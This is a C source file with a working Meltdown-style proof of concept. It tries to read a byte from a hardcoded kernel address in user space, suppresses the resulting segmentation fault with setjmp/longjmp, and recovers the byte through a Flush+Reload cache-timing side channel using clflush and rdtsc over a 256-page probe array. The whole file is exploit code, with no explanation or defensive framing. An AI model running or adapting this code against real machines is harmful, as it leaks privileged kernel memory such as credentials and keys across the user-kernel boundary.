#include <stdio.h>
#include <signal.h>
#include <x86intrin.h>
#include <setjmp.h>

#define PAGE_SIZE (4096)
#define CYCLES_CACHE_HIT 100
#define WANTED_VALUE 40

static jmp_buf context;

void segfault_handler() {
	// puts("received SIGSEGV");
	longjmp(context, 1);
}

int main() {

	unsigned char array[PAGE_SIZE*(256+1)];
	// unsigned int cycles_high_start, cycles_low_start,
				 // cycles_high_end, cycles_low_end;
	unsigned long cycles;
	unsigned long cycles_min = ~0;
	int i;
	int i_min = -1;
	// unsigned char dummy;
	unsigned char *page;

	unsigned long wanted_address = 0xffffffff81601448;

	// setup segfault handling
	struct sigaction segfault_act;
	segfault_act.sa_handler = segfault_handler;
	sigaction(SIGSEGV, &segfault_act, NULL);

	for(i=1; i<=256; i++)
		array[PAGE_SIZE*i] = i;

	for(i=1; i<=256; i++)
		_mm_clflush(&array[PAGE_SIZE*i]);

	if(setjmp(context))
		goto end;

	asm volatile (
			"%=:                              \n"
			"xorq %%rax, %%rax                \n"
			"movb (%[wanted_address]), %%al              \n"
			"shlq $0xc, %%rax                 \n"
			"jz %=b                           \n"
			"movq (%[array], %%rax, 1), %%rbx   \n"
			:
			:  [wanted_address] "r" (wanted_address), [array] "r" (array)
			:  "%rax", "%rbx");
end:

	for(i=1; i<=256; i++) {
		page = &array[PAGE_SIZE*i];
		asm volatile (
				"mfence             \n"
				"lfence             \n"
				"rdtsc              \n"
				"lfence             \n"
				"movl %%eax, %%esi  \n"
				"movl (%1), %%eax   \n"
				"lfence             \n"
				"rdtsc              \n"
				"subl %%esi, %%eax  \n"
				"clflush 0(%1)      \n"
				: "=a" (cycles)
				: "c" (page)
				:  "%esi", "%edx");

		// printf("cycles %3d: %lu\n", i, cycles);

		if(cycles <= cycles_min) {
			cycles_min = cycles;
			i_min = i;
		}
	}

	printf("min cycles %3d: %lu\n", i_min, cycles_min);
	// printf("dummy %d\n", (unsigned int) dummy);

	return 0;
}
